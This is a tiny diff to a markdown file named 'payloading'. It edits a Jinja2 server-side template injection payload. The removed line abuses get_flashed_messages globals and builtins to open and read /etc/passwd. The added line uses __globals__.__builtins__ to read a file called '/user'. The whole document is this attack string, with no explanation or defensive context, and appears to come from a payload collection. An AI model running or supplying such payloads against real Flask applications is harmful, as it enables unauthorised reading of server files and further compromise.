@@ -1,5 +1,5 @@
 # payloading
 
 ```
-{{ get_flashed_messages.globals.builtins.open("/etc/passwd").read() }}
+{{ get_flashed_messages.__globals__.__builtins__.open("/user").read() }}
 ```
